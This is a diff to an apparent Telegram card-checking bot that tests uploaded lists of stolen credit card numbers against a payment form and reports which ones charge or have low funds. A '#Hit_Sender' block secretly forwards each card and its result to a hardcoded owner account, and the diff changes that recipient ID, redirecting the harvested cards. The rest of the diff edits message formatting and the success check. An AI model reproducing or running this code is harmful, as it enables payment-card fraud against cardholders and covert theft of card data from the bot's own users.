@@ -22,7 +22,7 @@ def main(message):
 	ccn = 0
 	cvv = 0
 	lowfund = 0
-	ko = (bot.reply_to(message, "CHECKING....⌛").message_id)
+	ko = (bot.reply_to(message, "CHECKING....").message_id)
 	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
 	with open("combo.txt", "wb") as w:
 		w.write(ee)
@@ -34,7 +34,7 @@ def main(message):
 				current_dir = os.getcwd()
 				for filename in os.listdir(current_dir):
 					if filename.endswith(".stop"):
-						bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='STOP ✅\nBOT BY ➜ @strawhatchannel96')
+						bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='STOP \nBOT BY  @strawhatchannel96')
 						os.remove('stop.stop')
 						return
 				try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
@@ -65,45 +65,45 @@ def main(message):
 					print(e)
 					last = 'missing payment form'
 				mes = types.InlineKeyboardMarkup(row_width=1)
-				cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
-				status = types.InlineKeyboardButton(f"• STATUS ➜ {last} •", callback_data='u8')
-				cm3 = types.InlineKeyboardButton(f"• CHARGED ➜ [ {ch} ] •", callback_data='x')
-				cm4 = types.InlineKeyboardButton(f"• CCN ➜ [ {ccn} ] •", callback_data='x')
-				cm5 = types.InlineKeyboardButton(f"• CVV ➜ [ {cvv} ] •", callback_data='x')
-				cm6 = types.InlineKeyboardButton(f"• LOW FUNDS ➜ [ {lowfund} ] •", callback_data='x')
-				cm7 = types.InlineKeyboardButton(f"• DECLINED ➜ [ {dd} ] •", callback_data='x')
-				cm8 = types.InlineKeyboardButton(f"• TOTAL ➜ [ {total} ] •", callback_data='x')
+				cm1 = types.InlineKeyboardButton(f" {cc} ", callback_data='u8')
+				status = types.InlineKeyboardButton(f" STATUS  {last} ", callback_data='u8')
+				cm3 = types.InlineKeyboardButton(f" CHARGED  [ {ch} ] ", callback_data='x')
+				cm4 = types.InlineKeyboardButton(f" CCN  [ {ccn} ] ", callback_data='x')
+				cm5 = types.InlineKeyboardButton(f" CVV  [ {cvv} ] ", callback_data='x')
+				cm6 = types.InlineKeyboardButton(f" LOW FUNDS  [ {lowfund} ] ", callback_data='x')
+				cm7 = types.InlineKeyboardButton(f" DECLINED  [ {dd} ] ", callback_data='x')
+				cm8 = types.InlineKeyboardButton(f" TOTAL  [ {total} ] ", callback_data='x')
 				stop=types.InlineKeyboardButton(f"[ STOP ]", callback_data='stop')
 				mes.add(cm1,status, cm3, cm4, cm5, cm6, cm7, cm8, stop)
 				end_time = time.time()
 				execution_time = end_time - start_time
 				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait For Processing   
-by ➜ @strawhatchannel96 ''', reply_markup=mes)
+by  @strawhatchannel96 ''', reply_markup=mes)
 				msg = f''' 
-𝐂𝐀𝐑𝐃: <code>{cc}</code>
-𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Payment successful 🔥</code>
+: <code>{cc}</code>
+: <code>Payment successful </code>
 
-𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
-𝐁𝐚𝐧𝐤: <code>{bank}</code>
-𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>
+ : <code>{cc[:6]}-{card_type} - {brand}</code>
+: <code>{bank}</code>
+: <code>{country} - {country_flag}</code>
 
-𝐓𝐢𝐦𝐞: <code>1{"{:.1f}".format(execution_time)} second</code> 
-𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @strawhatchannel96'''
+: <code>1{"{:.1f}".format(execution_time)} second</code> 
+ : @strawhatchannel96'''
 
 #Hit_Sender
-				owner_id = 6403531779  #
+				owner_id = 7805235233  #
 				
-				card_info = f"💳 Card: {cc.strip()} \n📝 Message: Response: {last}"
+				card_info = f" Card: {cc.strip()} \n Message: Response: {last}"
 
 				if "Thank" in last or "thank" in last or "THANK" in last:
 				    with open("thank_cards.txt", "a") as thank_file:
 				        thank_file.write(card_info + "\n")
-				    bot.send_message(owner_id, f"✅ Thank Result Found:\n💳 Card: {cc.strip()}")
+				    bot.send_message(owner_id, f" Thank Result Found:\n Card: {cc.strip()}")
 
 				elif "insufficient funds" in last:
 				    with open("insufficient_cards.txt", "a") as insufficient_file:
  				       insufficient_file.write(card_info + "\n")
-				    bot.send_message(owner_id, f"⚠️ Insufficient Funds Card:\n💳 Card: {cc.strip()}")
+				    bot.send_message(owner_id, f" Insufficient Funds Card:\n Card: {cc.strip()}")
 
 				else:
 				    with open("other_cards.txt", "a") as other_file:
@@ -111,7 +111,7 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 #Hit_Sender
 				
 				print(last)
-				if 'succeeded' in last:
+				if 'Thank' in last:
 					ch += 1
 					bot.reply_to(message, msg)
 					
@@ -123,15 +123,15 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 					
 				elif 'insufficient funds' in last:
 					msg = f'''			
-𝐂𝐀𝐑𝐃: <code>{cc}</code>
-𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>INSUFFICIENT FUNDS 🔥</code>
+: <code>{cc}</code>
+: <code>INSUFFICIENT FUNDS </code>
 
-𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
-𝐁𝐚𝐧𝐤: <code>{bank}</code>
-𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>
+ : <code>{cc[:6]}-{card_type} - {brand}</code>
+: <code>{bank}</code>
+: <code>{country} - {country_flag}</code>
 
-𝐓𝐢𝐦𝐞: <code>1{"{:.1f}".format(execution_time)} second</code> 
-𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @strawhatchannel96'''
+: <code>1{"{:.1f}".format(execution_time)} second</code> 
+ : @strawhatchannel96'''
 					lowfund += 1
 					bot.reply_to(message, msg)
 					
@@ -143,7 +143,7 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 					time.sleep(5)
 	except Exception as e:
 		print(e)
-	bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='CHECKED ✅\nBOT BY ➜ @strawhatchannel96')
+	bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='CHECKED \nBOT BY  @strawhatchannel96')
 @bot.callback_query_handler(func=lambda call: call.data == 'stop')
 def menu_callback(call):
 	with open("stop.stop", "w") as file:
